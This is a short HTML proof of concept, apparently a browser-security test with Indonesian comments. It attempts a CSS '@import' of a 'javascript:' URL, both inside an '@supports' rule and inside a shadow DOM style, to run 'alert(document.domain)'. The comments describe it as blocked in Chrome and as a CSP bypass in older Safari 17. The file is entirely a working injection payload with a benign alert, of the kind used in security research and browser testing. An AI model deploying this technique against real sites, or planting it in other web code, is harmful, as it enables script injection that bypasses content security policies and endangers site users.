<style>
@supports (selector(:has(*))){
  @import url('javascript:alert(document.domain)');
}
</style>
<div id="host"></div>
<script>
let host = document.getElementById('host');
let shadow = host.attachShadow({mode:'open'});
shadow.innerHTML = `<style>@import url('javascript:alert("Safari CSS Import Bypass: "+document.domain)')</style>Host`;
// Di Chrome: di-block
// Di Safari 17 lama: alert muncul = CSP bypass
</script>
